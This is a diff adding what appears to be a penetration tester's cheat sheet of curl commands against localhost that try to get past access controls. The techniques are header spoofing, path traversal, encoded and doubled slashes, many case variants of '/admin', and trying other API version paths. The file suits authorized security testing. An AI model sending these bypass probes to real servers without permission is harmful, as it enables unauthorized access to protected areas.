@@ -1,0 +1,48 @@
+curl -H 'X-FORWARDED_FOR: 127.0.0.1' https://127.0.0.1:8080/secret
+curl 'https://127.0.0.1:3000/secure/./admin'
+curl 'https://127.0.0.1:3000/secure/../admin'
+curl 'https://127.0.0.1:3000/hidden'
+curl 'https://127.0.0.1:3000/hidden%2f'
+curl 'https://127.0.0.1:3000/hidden%252f'
+curl 'https://127.0.0.1:3000/admin'
+curl 'https://127.0.0.1:3000//admin'
+curl 'https://127.0.0.1:3000///admin'
+curl 'https://127.0.0.1:3000///ADMIN'
+curl 'https://127.0.0.1:3000///AdMiN'
+curl 'https://127.0.0.1:3000///AdMiN'
+curl 'https://127.0.0.1:3000///aDMin'
+curl 'https://127.0.0.1:3000///aDmiN'
+curl 'https://127.0.0.1:3000///aDMin'
+curl 'https://127.0.0.1:3000///aDmiN'
+curl 'https://127.0.0.1:3000///adMIN'
+curl 'https://127.0.0.1:3000///adMin'
+curl 'https://127.0.0.1:3000///admiN'
+curl 'https://127.0.0.1:3000///aDMiN'
+curl 'https://127.0.0.1:3000///AdMIn'
+curl 'https://127.0.0.1:3000///adMIN'
+curl 'https://127.0.0.1:3000///AdmiN'
+curl 'https://127.0.0.1:3000///ADmin'
+curl 'https://127.0.0.1:3000///ADMiN'
+curl 'https://127.0.0.1:3000///aDMiN'
+curl 'https://127.0.0.1:3000///aDMIn'
+curl 'https://127.0.0.1:3000///admin'
+curl 'https://127.0.0.1:3000///Admin'
+curl 'https://127.0.0.1:3000///aDmin'
+curl 'https://127.0.0.1:3000///adMin'
+curl 'https://127.0.0.1:3000///ADmiN'
+curl 'https://127.0.0.1:3000///adMIn'
+curl 'https://127.0.0.1:3000///ADMIN'
+curl 'https://127.0.0.1:3000///aDMin'
+curl 'https://127.0.0.1:3000///ADMIn'
+curl 'https://127.0.0.1:3000///aDMIN'
+curl 'https://127.0.0.1:3000///aDmin'
+curl 'https://127.0.0.1:3000///ADmiN'
+curl 'https://127.0.0.1:3000///ADMiN'
+curl 'https://127.0.0.1:3000///AdmiN'
+
+
+
+if you see that api is try to change /api, /api/v1, /v1, /v2, /v3 etc
+
+
+https://www.w3schools.com/tags/ref_urlencode.ASP
